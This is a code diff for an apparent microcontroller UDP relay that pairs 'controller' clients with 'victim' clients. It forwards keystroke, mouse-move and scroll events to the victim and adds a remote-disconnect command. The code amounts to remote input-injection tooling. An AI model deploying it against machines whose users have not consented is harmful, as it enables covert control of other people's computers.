@@ -10,6 +10,8 @@ p = controller pairs with victim
 u = controller un-pairs from victim
 n = key-pressed event
 m = key-released event
+l = mouse move event
+k = mouse scroll
 */
 
 WiFiUDP socket;
@@ -73,6 +75,9 @@ void loop() {
 		for (int i = 0; i < len; i++)
 			str = str + buf[i];
 
+		//if (str[0] != 'r')
+		//	Serial.println(len);
+
 		bool isNewClient = true;
 		//check if the message is from an existing client
 		for (auto& c : clients) {
@@ -108,25 +113,42 @@ void loop() {
 					//if its not the paired client, skip it
 					if (o.otherIp != c.ip.toString().c_str() || o.otherPort != c.port)
 						continue;
+
+					socket.beginPacket(o.ip, o.port);
+   	 			socket.write("a");
+    			socket.endPacket();
 					o.otherIp = "-";
 					o.otherPort = 0;
-					if (!o.isVictim) {
-						socket.beginPacket(o.ip, o.port);
-   	 				socket.write("u");
-    				socket.endPacket();
-					}
 					break;
-				}
+				}					
+				socket.beginPacket(c.ip, c.port);
+   	 		socket.write("u");
+    		socket.endPacket();
 				c.otherIp = "-";
 				c.otherPort = 0;
 			}
-			//forward key pressed-released event
-			else if ((str[0] == 'n' || str[0] == 'm') && !c.isVictim && c.otherIp != "-") {
-				Serial.println(str.c_str());
+			//disconnect clients on request
+			else if (str[0] == 'e' && !c.isVictim) {
+				IPAddress ip(str.substr(1, str.find(';')-1).c_str());
+				int port = stoi(str.substr(str.find(';')+1, str.size()-1));
+				for (int i = 0; i < clients.size(); i++) {
+					if (clients[i].ip != ip || clients[i].port != port)
+						continue;
+
+					socket.beginPacket(ip, port);
+   	 			socket.write("e");
+    			socket.endPacket();
+					break;
+				}
+			}
+			//forward input events
+			else if ((str[0] == 'n' || str[0] == 'm'|| str[0] == 'l'|| str[0] == 'k' 
+			 || str[0] == 'a') && !c.isVictim && c.otherIp != "-") {
 				socket.beginPacket(IPAddress(c.otherIp.c_str()), c.otherPort);
    	 		socket.write(str.c_str());
     		socket.endPacket();
 			}
+
 			c.isActive = true, isNewClient = false;
 			break;
 		}
@@ -213,7 +235,7 @@ void loop() {
 	}
 	//send client list
 	if (millis() - lastUpdate > 3'000) {
-		sendControllers("e");
+		sendControllers("r");
 		for (auto c : clients) {
 			std::string msg = "";
 			msg = (c.isVictim) ? "l" : "n";
